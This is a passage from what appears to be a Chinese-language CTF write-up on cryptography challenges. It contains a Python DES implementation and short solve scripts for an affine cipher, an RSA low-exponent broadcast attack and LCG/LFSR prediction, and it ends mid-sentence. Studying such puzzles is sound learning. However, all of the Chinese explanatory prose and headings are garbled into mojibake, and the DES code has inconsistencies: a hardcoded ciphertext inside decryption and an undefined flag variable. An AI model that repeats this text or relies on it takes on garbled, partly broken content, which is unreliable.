<span class="number">9</span>, ],</span><br><span class="line">     [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>, ],</span><br><span class="line">     [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">      <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>, ],</span><br><span class="line">     [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">      <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>, ],</span><br><span class="line">     [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">      <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">      <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>, ],</span><br><span class="line">     [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">      <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, ],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, ],</span><br><span class="line">     [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, ]]</span><br><span class="line">PC_1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">        <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>,</span><br><span class="line">        <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, ]</span><br><span class="line">PC_2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">        <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>, ]</span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">     <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">     <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>, ]</span><br><span class="line">movnum = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HexToBin</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"Convert sixteen to binary"</span></span><br><span class="line"></span><br><span class="line">    Binstring = <span class="string">""</span></span><br><span class="line">    string = string.lower()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            Binstring += hexadecimalcontrast[i]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> Binstring</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinToStr</span><span class="params">(strbin)</span>:</span></span><br><span class="line">    <span class="string">"Turn the binary string to a ASCII string"</span></span><br><span class="line"></span><br><span class="line">    strten = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strbin) // <span class="number">8</span>):</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        test = strbin[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            num += int(test[j]) * (<span class="number">2</span>**(<span class="number">7</span> - j))</span><br><span class="line">        strten += chr(num)</span><br><span class="line">    <span class="keyword">return</span> strten</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StrToHex</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"Converts a string to HEX"</span></span><br><span class="line"></span><br><span class="line">    hexStr = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        tmp = str(hex(ord(i)))</span><br><span class="line">        <span class="keyword">if</span> len(tmp) == <span class="number">3</span>:</span><br><span class="line">            hexStr += tmp.replace(<span class="string">'0x'</span>, <span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hexStr += tmp.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> hexStr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Binxor</span><span class="params">(string1, string2)</span>:</span></span><br><span class="line">    <span class="string">"If the length is different, only the short one is returned."</span></span><br><span class="line"></span><br><span class="line">    strlen = <span class="number">0</span></span><br><span class="line">    xorstr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> len(string1) &gt; len(string2):</span><br><span class="line">        strlen = len(string2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strlen = len(string1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(strlen):</span><br><span class="line">        <span class="keyword">if</span> string1[i] == string2[i]:</span><br><span class="line">            xorstr += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            xorstr += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> xorstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubstitutionBox</span><span class="params">(keyfield, sub)</span>:</span></span><br><span class="line"></span><br><span class="line">    newkeyfield = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sub)):</span><br><span class="line">        newkeyfield += keyfield[sub[i] - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> newkeyfield</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubkeyGeneration</span><span class="params">(freq, C, D)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(movnum[freq]):</span><br><span class="line">        C = C[<span class="number">1</span>:] + C[:<span class="number">1</span>]</span><br><span class="line">        D = D[<span class="number">1</span>:] + D[:<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> C, D, SubstitutionBox(C + D, PC_2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enkey</span><span class="params">(secretkey)</span>:</span> </span><br><span class="line"></span><br><span class="line">    netss = SubstitutionBox(HexToBin(StrToHex(secretkey)), PC_1)</span><br><span class="line">    C, D = netss[:<span class="number">28</span>], netss[<span class="number">28</span>:]</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>): </span><br><span class="line">        C, D, keyone = SubkeyGeneration(i, C, D)</span><br><span class="line">        key.append(keyone)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sbox</span><span class="params">(plaintext, sub)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HexToBin(<span class="string">"%x"</span> % S[sub][int(plaintext[:<span class="number">1</span>] + plaintext[<span class="number">-1</span>:], <span class="number">2</span>) * <span class="number">16</span> + int(plaintext[<span class="number">1</span>:<span class="number">-1</span>], <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Function</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    plaintext = Binxor(SubstitutionBox(plaintext, E),</span><br><span class="line">                       secretkey)</span><br><span class="line">    sout = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        sout += Sbox(plaintext[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>], i)</span><br><span class="line">    sout = SubstitutionBox(sout, P)</span><br><span class="line">    <span class="keyword">return</span> sout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">endecrypt</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    netss = SubstitutionBox(HexToBin(StrToHex(plaintext)), IP)</span><br><span class="line">    L, R = netss[:<span class="number">32</span>], netss[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        L, R = R, Binxor(L, Function(R, secretkey[i]))</span><br><span class="line">    <span class="keyword">return</span> SubstitutionBox(R + L, IP_1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    plaintext = plaintext + (<span class="number">8</span> - len(plaintext) % <span class="number">8</span>) * <span class="string">'\0'</span></span><br><span class="line">    keys = enkey(secretkey[:<span class="number">8</span>])</span><br><span class="line">    print(keys)</span><br><span class="line">    ciphertext = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">8</span>):</span><br><span class="line">        ciphertext += endecrypt(plaintext[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], keys)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(BinToStr(ciphertext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line">    plaintext = <span class="string">"t2GzuEfVDaJsNLBqC8N7C3/2UgIeCoQLC2qLkT1ukFULskzMc1u9QeFizVUfFYfA"</span></span><br><span class="line">    plaintext = base64.b64decode(plaintext)</span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br><span class="line">    keys = enkey(secretkey[:<span class="number">8</span>])[::<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">#print(keys)</span></span><br><span class="line">    ciphertext = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">8</span>):</span><br><span class="line">        ciphertext += endecrypt(plaintext[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], keys)</span><br><span class="line">    <span class="keyword">return</span> (BinToStr(ciphertext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">()</span>:</span></span><br><span class="line">    fw = open(<span class="string">"random"</span>, <span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">700</span>):</span><br><span class="line">        fw.write(str(random.getrandbits(<span class="number">32</span>))+<span class="string">"\n"</span>)</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line">generate()</span><br><span class="line">f = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">key = str(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">key = <span class="string">'2990136190'</span></span><br><span class="line">ciphertext = decryption(flag, key)</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br></pre></td></tr></table></figure><h1 id="æœ±é›€ç»„"><a href="#æœ±é›€ç»„" class="headerlink" title="æœ±é›€ç»„"></a>æœ±é›€ç»„</h1><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><p>ç®€å•ä»¿å°„åŠ å¯†ï¼Œå°±æ˜¯123456å’Œ26ä¸äº’ç´ ï¼Œæˆ‘ä»¬ç”¨26çš„ä¸€ä¸ªç´ å› å­13ä»£æ›¿26å…ˆï¼Œå¾—åˆ°çš„ç­”æ¡ˆï¼Œå¯ä»¥é€‰æ‹©ï¼šå¦‚æœä¸ç¬¦åˆuuidæ ¼å¼ï¼Œå°±åŠ ä¸ª13ï¼Œä¸è¿‡ï¼Œåæ¥æƒ³æƒ³ï¼Œç”±äºuuidåªæœ‰abcdefåŠ ä¸Š â€˜flagâ€™ çš„lgï¼Œæ¨¡13å…¶å®æ˜¯è¶³å¤Ÿçš„ã€‚æ‰€ä»¥å…¶å®ä¸éœ€è¦åˆ¤æ–­ã€‚</p><p>ç”±äºä»¿å°„ä¸åŠ å¯†é™¤å­—æ¯å¤–çš„å­—ç¬¦ï¼Œæ‰€ä»¥ç›´æ¥æ‹¼æ¥ä¸Šæ¥å°±å¯ä»¥äº†</p><p>ç¡®å®simpleï¼Œè§£å¯†ä»£ç å°±ä¸€è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line">flag = <span class="string">''</span>.join(i <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"qwertyuiopasdfghjklzxcvbnm"</span> <span class="keyword">else</span> chr(((ord(i)-ord(<span class="string">'a'</span>) - <span class="number">321564</span>))*inverse(<span class="number">123456</span>,<span class="number">13</span>)%<span class="number">13</span>+ord(<span class="string">'a'</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'kgws&#123;m8u8cm65-ue9k-44k5-8361-we225m76eeww&#125;'</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="RUA"><a href="#RUA" class="headerlink" title="RUA"></a>RUA</h2><p>rsaä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼Œç›´æ¥å¥—<a href="https://xz.aliyun.com/t/6459#toc-37" target="_blank" rel="noopener">å…ˆçŸ¥</a>ä¸Šçš„ä¸€ä¸ªè„šæœ¬ï¼Œåˆšå¼€å§‹æµ‹e=3ï¼Œå‘ç°å¤±è´¥ï¼Œäºæ˜¯çˆ†ç ´e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii,gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m=gmpy2.iroot(CRT([n1,n2,n3], [c1,c2,c3]), e)[<span class="number">0</span>]</span><br><span class="line">        print(binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h2><p>ä¸¤ä¸ªè€ƒç‚¹ï¼šLCGå’ŒLFSR</p><p>LCGæ”»å‡»åŸç†<a href="https://www.codercto.com/a/35743.html" target="_blank" rel="noopener">è¿™é‡Œ</a>çœ‹ï¼ŒNCTFå‡ºç°è¿‡çš„ã€‚</p><p>LFSRçš„æ”»å‡»æ‰‹æ³•<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr-zh/" target="_blank" rel="noopener">ctf-wiki</a>ä¸Šçœ‹ã€‚</p><p>è§£å¯†æµç¨‹ï¼š</p><p>ç¬¬ä¸€æ­¥æˆ‘ä»¬é€šè¿‡å…­ä¸ªlevelçš„å€¼æ¢å¤LCGçš„å‚æ•°ä»è€Œé¢„æµ‹ç¬¬ä¸ƒä¸ªcodeï¼Œä»è€Œè¾¾åˆ°(500,10)è¿™ä¸ªlevelã€‚<del>å¼€å±€æ‹¥æœ‰10ä¸ªcoinï¼</del></p><p>ç„¶åæˆ‘ä»¬ç”¨9æ¬¡æœºä¼šï¼Œå¯ä»¥å¾—åˆ°72bitçš„è¾“å‡ºï¼Œå…¶ä¸­å‰40bitè¾“å‡ºé€†åºå¯ä»¥å¾—åˆ°åˆå§‹çš„r</p><p>ä½†æ˜¯è¿™é‡Œçš„lfsrå…¶å®æ˜¯39çº§çš„ï¼Œæ‰€ä»¥è‡³å°‘éœ€è¦78bitæ‰èƒ½æ¢å¤</p><p>æ‰€ä»¥æˆ‘ä»¬è¦çˆ†ç ´6bitçš„è¾“å‡º</p><p>éœ€è¦è¯´æ˜çš„æ˜¯å³ä½¿æœ‰78bitçš„è¾“å‡ºï¼Œä¹Ÿæœ‰å¯èƒ½å› 